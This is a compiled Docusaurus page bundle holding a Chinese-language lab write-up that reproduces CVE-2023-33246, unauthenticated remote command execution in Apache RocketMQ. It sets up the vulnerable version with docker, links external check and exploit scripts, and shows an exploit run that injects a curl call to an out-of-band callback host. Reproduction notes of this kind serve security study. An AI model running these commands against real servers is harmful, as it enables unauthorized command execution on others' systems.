"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[52],{428:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>a,default:()=>d,frontMatter:()=>s,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/cve/2023/CVE-2023-33246","title":"CVE-2023-33246","description":"CVE-2023-33246","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/04.cve/2023/01.CVE-2023-33246.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/04.cve/2023","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/cve/2023/CVE-2023-33246","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/cve/2023/CVE-2023-33246","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/04.cve/2023/01.CVE-2023-33246.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"TrojanPanel\u672a\u6388\u6743\u6dfb\u52a0\u7528\u6237","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Trojanpanel/TrojanPanel\u672a\u6388\u6743\u6dfb\u52a0\u7528\u6237"},"next":{"title":"CVE-2023-33979","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/cve/2023/CVE-2023-33979"}}');var o=t(4848),c=t(8453);const s={},a=void 0,i={},l=[{value:"\u73af\u5883\u642d\u5efa",id:"\u73af\u5883\u642d\u5efa",level:2},{value:"\u653b\u51fb",id:"\u653b\u51fb",level:2}];function p(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",p:"p",pre:"pre",...(0,c.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.p,{children:"CVE-2023-33246"}),"\n",(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsx)(n.p,{children:"\u5bf9\u4e8eRocketMQ 5.1.0\u53ca\u4ee5\u4e0b\u7248\u672c\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7684\u98ce\u9669\u3002RocketMQ\u7684\u51e0\u4e2a\u7ec4\u4ef6\uff0c\u5305\u62ecNameServer\u3001Broker\u548cController\uff0c\u5728extranet\u4e0a\u6cc4\u9732\uff0c\u5e76\u4e14\u7f3a\u4e4f\u6743\u9650\u9a8c\u8bc1\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u66f4\u65b0\u914d\u7f6e\u529f\u80fd\u4f5c\u4e3aRocketMQ\u8fd0\u884c\u7684\u7cfb\u7edf\u7528\u6237\u6267\u884c\u547d\u4ee4\u6765\u5229\u7528\u6b64\u6f0f\u6d1e\u3002\u6b64\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4f2a\u9020RocketMQ\u534f\u8bae\u5185\u5bb9\u6765\u8fbe\u5230\u540c\u6837\u7684\u6548\u679c\u3002\u4e3a\u4e86\u9632\u6b62\u8fd9\u4e9b\u653b\u51fb\uff0c\u5efa\u8bae\u7528\u6237\u5347\u7ea7\u52305.1.1\u6216\u66f4\u9ad8\u7248\u672c\u4ee5\u4f7f\u7528RocketMQ 5.x\uff0c\u6216\u5347\u7ea7\u52304.9.6\u6216\u66f4\u9ad8\u7248\u4ee5\u4f7f\u7528Rocket MQ 4.x\u3002"}),"\n"]}),"\n",(0,o.jsx)(n.h2,{id:"\u73af\u5883\u642d\u5efa",children:"\u73af\u5883\u642d\u5efa"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:'docker pull apache/rocketmq:4.9.4\n# Start nameserver\ndocker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.4 sh mqnamesrv\n# Start Broker\ndocker run -d --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.4 sh mqbroker -c /home/rocketmq/rocketmq-4.9.4/conf/broker.conf\n'})}),"\n",(0,o.jsx)(n.h2,{id:"\u653b\u51fb",children:"\u653b\u51fb"}),"\n",(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsxs)(n.p,{children:["poc: ",(0,o.jsx)(n.a,{href:"https://github.com/wjlin0/poc/blob/main/nuclei/CVE-2023-33246/check.py",children:"check.py"})]}),"\n",(0,o.jsxs)(n.p,{children:["exp: ",(0,o.jsx)(n.a,{href:"https://github.com/wjlin0/poc/blob/main/nuclei/CVE-2023-33246/poc/CVE-2023-33246/exp.py",children:"exp.py"})]}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"# Detect RocketMQ version to identify vulnerabilities\n```\npython3 check.py --ip 127.0.0.1 --port 9876\n# or \npython3 check.py --file rocketmq_targets.txt --port 9876\n```\n\n# Run exploit\n```\npython3 exp.py 127.0.0.1 10911 curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test\n```\n\n"})})]})}function d(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(p,{...e})}):p(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>s,x:()=>a});var r=t(6540);const o={},c=r.createContext(o);function s(e){const n=r.useContext(c);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:s(e.components),r.createElement(c.Provider,{value:n},e.children)}}}]);